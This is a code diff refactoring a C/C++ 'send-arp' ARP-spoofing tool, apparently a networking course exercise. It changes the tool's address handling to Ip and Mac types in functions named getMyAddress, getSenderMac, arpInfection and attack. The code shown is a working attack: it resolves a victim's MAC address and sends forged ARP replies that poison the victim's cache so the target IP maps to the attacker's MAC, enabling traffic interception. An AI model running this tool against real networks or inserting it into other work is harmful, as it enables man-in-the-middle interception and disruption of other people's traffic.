@@ -21,7 +21,7 @@ void usage()
     printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
 }
 
-int getMyAddress(char *if_name, char *attacker_ip, uint8_t *attacker_mac)
+int getMyAddress(char *if_name, Ip *attacker_ip, Mac *attacker_mac)
 {
     int fd = socket(AF_INET, SOCK_DGRAM, 0);
     if (fd == -1)
@@ -48,7 +48,7 @@ int getMyAddress(char *if_name, char *attacker_ip, uint8_t *attacker_mac)
         return -1;
     }
     struct sockaddr_in *ip_addr = (struct sockaddr_in *)&ifr.ifr_addr;
-    strcpy(attacker_ip, inet_ntoa(ip_addr->sin_addr));
+    memcpy((void *)attacker_ip, &ip_addr->sin_addr, sizeof(Ip));
 
     if (ioctl(fd, SIOCGIFHWADDR, &ifr) == -1)
     {
@@ -56,13 +56,13 @@ int getMyAddress(char *if_name, char *attacker_ip, uint8_t *attacker_mac)
         close(fd);
         return -1;
     }
-    memcpy(attacker_mac, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
+    memcpy((void *)attacker_mac, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
 
     close(fd);
     return 0;
 }
 
-int getSenderMac(pcap_t *handle, char *attacker_ip, uint8_t *attacker_mac, char *sender_ip, uint8_t *sender_mac)
+int getSenderMac(pcap_t *handle, Ip attacker_ip, Mac attacker_mac, Ip sender_ip, Mac *sender_mac)
 {
     EthArpPacket packet_;
 
@@ -102,11 +102,11 @@ int getSenderMac(pcap_t *handle, char *attacker_ip, uint8_t *attacker_mac, char 
 
         struct EthHdr *eth_hdr = (struct EthHdr *)(packet);
         struct ArpHdr *arp_hdr = (struct ArpHdr *)(packet + sizeof(EthHdr));
-        if (ntohs(eth_hdr->type_) == EthHdr::Arp && ntohs(arp_hdr->op_) == ArpHdr::Reply)
+        if (ntohs(eth_hdr->type_) == EthHdr::Arp && ntohs(arp_hdr->op_) == ArpHdr::Reply && arp_hdr->sip_ == Ip(sender_ip))
         {
             if (eth_hdr->dmac_ == attacker_mac)
             {
-                memcpy(sender_mac, &eth_hdr->smac_, ETH_ALEN);
+                memcpy((void *)sender_mac, &eth_hdr->smac_, ETH_ALEN);
                 break;
             }
         }
@@ -115,7 +115,7 @@ int getSenderMac(pcap_t *handle, char *attacker_ip, uint8_t *attacker_mac, char 
     return 0;
 }
 
-int arpInfection(pcap_t *handle, uint8_t *attacker_mac, char *sender_ip, uint8_t *sender_mac, char *target_ip)
+int arpInfection(pcap_t *handle, Mac attacker_mac, Ip sender_ip, Mac sender_mac, Ip target_ip)
 {
     EthArpPacket packet_;
 
@@ -129,9 +129,9 @@ int arpInfection(pcap_t *handle, uint8_t *attacker_mac, char *sender_ip, uint8_t
     packet_.arp_.pln_ = Ip::SIZE;
     packet_.arp_.op_ = htons(ArpHdr::Reply);
     packet_.arp_.smac_ = attacker_mac;
-    packet_.arp_.sip_ = htonl(Ip(target_ip));
+    packet_.arp_.sip_ = target_ip;
     packet_.arp_.tmac_ = sender_mac;
-    packet_.arp_.tip_ = htonl(Ip(sender_ip));
+    packet_.arp_.tip_ = sender_ip;
 
     int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet_), sizeof(EthArpPacket));
     if (res != 0)
@@ -143,10 +143,10 @@ int arpInfection(pcap_t *handle, uint8_t *attacker_mac, char *sender_ip, uint8_t
     return 0;
 }
 
-int attack(pcap_t *handle, char *attacker_ip, uint8_t *attacker_mac, char *sender_ip, char *target_ip)
+int attack(pcap_t *handle, Ip attacker_ip, Mac attacker_mac, Ip sender_ip, Ip target_ip)
 {
-    uint8_t sender_mac[ETH_ALEN];
-    if (getSenderMac(handle, attacker_ip, attacker_mac, sender_ip, sender_mac) == -1)
+    Mac sender_mac;
+    if (getSenderMac(handle, attacker_ip, attacker_mac, sender_ip, &sender_mac) == -1)
     {
         printf("ERR: getSenderMac()\n");
         return -1;
@@ -178,9 +178,11 @@ int main(int argc, char *argv[])
         return -1;
     }
 
-    char attacker_ip[INET_ADDRSTRLEN];
-    uint8_t attacker_mac[ETH_ALEN];
-    if (getMyAddress(dev, attacker_ip, attacker_mac) == -1)
+    Ip attacker_ip;
+    // char attacker_ip[INET_ADDRSTRLEN];
+    Mac attacker_mac;
+    // uint8_t attacker_mac[ETH_ALEN];
+    if (getMyAddress(dev, &attacker_ip, &attacker_mac) == -1)
     {
         printf("ERR: getMyAddress()\n");
         pcap_close(handle);
@@ -190,15 +192,15 @@ int main(int argc, char *argv[])
     int num_victim = (argc - 2) / 2;
     for (int i = 1; i <= num_victim; i++)
     {
-        char *sender_ip = argv[i * 2];
-        char *target_ip = argv[i * 2 + 1];
+        Ip sender_ip(argv[i * 2]);
+        Ip target_ip(argv[i * 2 + 1]);
         if (attack(handle, attacker_ip, attacker_mac, sender_ip, target_ip) == -1)
         {
             printf("ERR: attack()\n");
             pcap_close(handle);
             return -1;
         }
-        printf("ATTACK %d COMPLETED (%s %s)\n", i, sender_ip, target_ip);
+        printf("ATTACK %d COMPLETED (%s %s)\n", i, std::string(sender_ip).data(), std::string(target_ip).data());
     }
 
     pcap_close(handle);
